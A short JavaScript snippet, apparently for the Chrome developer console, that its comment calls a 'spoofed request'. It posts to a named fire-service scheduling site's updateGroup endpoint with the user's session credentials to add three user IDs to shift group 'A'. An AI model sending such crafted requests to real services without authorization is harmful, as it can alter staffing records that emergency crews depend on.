//Example of spoofed request to add users to an existing shift group called "A" from the Chrome Developer Console
fetch("https://sizeup.firstduesizeup.com/shift/group/updateGroup", {
  "headers": {
    "accept": "*/*",
    "accept-language": "en-US,en;q=0.9,ru;q=0.8,es;q=0.7",
    "cache-control": "no-cache",
    "content-type": "application/json;charset=UTF-8",
    "pragma": "no-cache",
    "sec-ch-ua": "\"Chromium\";v=\"104\", \" Not A;Brand\";v=\"99\", \"Google Chrome\";v=\"104\"",
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": "\"Windows\"",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-origin",
    "x-requested-with": "XMLHttpRequest"
  },
  "referrer": "https://sizeup.firstduesizeup.com/shift/setup/groups/1564",
  "referrerPolicy": "strict-origin-when-cross-origin",
  "body": "{\"group\":{\"id\":1564,\"name\":\"A\",\"shortcode\":\"A\",\"color\":\"#f44336\"},\"addUserIds\":\"117686, 117978, 117991\",\"deleteUserIds\":\"\"}",
  "method": "POST",
  "mode": "cors",
  "credentials": "include"
});
